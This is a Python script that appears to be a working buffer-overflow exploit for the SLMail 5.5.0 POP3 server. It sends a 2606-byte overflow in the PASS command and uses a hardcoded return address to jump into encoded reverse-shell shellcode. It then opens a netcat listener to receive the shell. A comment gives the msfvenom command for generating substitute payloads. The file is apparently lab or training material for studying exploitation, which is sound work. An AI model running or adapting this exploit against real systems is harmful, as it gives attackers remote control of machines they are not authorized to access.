#!/usr/bin/python
#---------------------------------------------------------------------------------------------#
# Software      = SLMail 5.5.0 Server                                                         #
# Download Link = http://downloads.informer.com/slmail/5.5/                                   #
# Reference     = https://www.exploit-db.com/exploits/638/                                    #
# Date          = 10/14/2018                                                                  #
# Author        = @TJ_Null                                                                    #
# Tested on     = Windows 7   - Professional SP1                                              #
#                 Windows XP  - Professional SP3                                              #
#                 Windows 8.1 - Enterprise                                                    #
# EIP Offset    = 2606                                                                        #
# Badchars      = "\x00\x0a\x0d"                                                              #
# RET Address   = 0x5f4a358f : "\xFF\xE4" | [SLMFC.DLL]                                       #
# Usage         = python exploit.py <target IP>                                               #        
#---------------------------------------------------------------------------------------------#

import sys
import socket
import time
import struct
import subprocess


if len(sys.argv) < 2:
  print "Usage               : python exploit.py <target IP>"
  print "Example             : python exploit.py 10.11.0.100"
  sys.exit(0)

HOST = sys.argv[1]

  
#----------------------------------------------------------------------------------------------------------------------------------------------------------------#
# To replace shellcode use: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.117.132 LPORT=1337 -b "\x00\x0a\x0d" -f python -v payload -e x86/shikata_ga_nai  #
#----------------------------------------------------------------------------------------------------------------------------------------------------------------#

payload =  ""
payload += "\xbf\xe4\x24\xa2\x95\xdb\xd5\xd9\x74\x24\xf4\x5d"
payload += "\x31\xc9\xb1\x52\x83\xc5\x04\x31\x7d\x0e\x03\x99"
payload += "\x2a\x40\x60\x9d\xdb\x06\x8b\x5d\x1c\x67\x05\xb8"
payload += "\x2d\xa7\x71\xc9\x1e\x17\xf1\x9f\x92\xdc\x57\x0b"
payload += "\x20\x90\x7f\x3c\x81\x1f\xa6\x73\x12\x33\x9a\x12"
payload += "\x90\x4e\xcf\xf4\xa9\x80\x02\xf5\xee\xfd\xef\xa7"
payload += "\xa7\x8a\x42\x57\xc3\xc7\x5e\xdc\x9f\xc6\xe6\x01"
payload += "\x57\xe8\xc7\x94\xe3\xb3\xc7\x17\x27\xc8\x41\x0f"
payload += "\x24\xf5\x18\xa4\x9e\x81\x9a\x6c\xef\x6a\x30\x51"
payload += "\xdf\x98\x48\x96\xd8\x42\x3f\xee\x1a\xfe\x38\x35"
payload += "\x60\x24\xcc\xad\xc2\xaf\x76\x09\xf2\x7c\xe0\xda"
payload += "\xf8\xc9\x66\x84\x1c\xcf\xab\xbf\x19\x44\x4a\x6f"
payload += "\xa8\x1e\x69\xab\xf0\xc5\x10\xea\x5c\xab\x2d\xec"
payload += "\x3e\x14\x88\x67\xd2\x41\xa1\x2a\xbb\xa6\x88\xd4"
payload += "\x3b\xa1\x9b\xa7\x09\x6e\x30\x2f\x22\xe7\x9e\xa8"
payload += "\x45\xd2\x67\x26\xb8\xdd\x97\x6f\x7f\x89\xc7\x07"
payload += "\x56\xb2\x83\xd7\x57\x67\x03\x87\xf7\xd8\xe4\x77"
payload += "\xb8\x88\x8c\x9d\x37\xf6\xad\x9e\x9d\x9f\x44\x65"
payload += "\x76\x60\x30\x10\x07\x08\x43\xda\x02\xf0\xca\x3c"
payload += "\x66\x12\x9b\x97\x1f\x8b\x86\x63\x81\x54\x1d\x0e"
payload += "\x81\xdf\x92\xef\x4c\x28\xde\xe3\x39\xd8\x95\x59"
payload += "\xef\xe7\x03\xf5\x73\x75\xc8\x05\xfd\x66\x47\x52"
payload += "\xaa\x59\x9e\x36\x46\xc3\x08\x24\x9b\x95\x73\xec"
payload += "\x40\x66\x7d\xed\x05\xd2\x59\xfd\xd3\xdb\xe5\xa9"
payload += "\x8b\x8d\xb3\x07\x6a\x64\x72\xf1\x24\xdb\xdc\x95"
payload += "\xb1\x17\xdf\xe3\xbd\x7d\xa9\x0b\x0f\x28\xec\x34"
payload += "\xa0\xbc\xf8\x4d\xdc\x5c\x06\x84\x64\x6c\x4d\x84"
payload += "\xcd\xe5\x08\x5d\x4c\x68\xab\x88\x93\x95\x28\x38"
payload += "\x6c\x62\x30\x49\x69\x2e\xf6\xa2\x03\x3f\x93\xc4"
payload += "\xb0\x40\xb6"





#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = AAA...........AAA #
# buffer = EIP               #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#


buffer =  "A" * 2606
buffer += struct.pack('<L', 0x5f4a358f)
buffer += "\x90" * 40
buffer += payload
buffer += "B" * (3500-2606-4-40-len(payload))

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  print "[+] Connecting to SLMail 5.5.0 Server with an IP Address %s on port 110" %HOST
  time.sleep(2)
  s.connect((HOST,110))
  data = s.recv(1024)
  s.send('USER username' +'\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "[+] Sending %s bytes of evil payload..." %len(buffer)
  time.sleep(2)
  print "[+] Incoming shell <(^,^)>"
  subprocess.call(['nc -lnvp 1337'], shell=True)
except:
  print "Could not connect to SLMail 5.5.0 Server (-__-)"

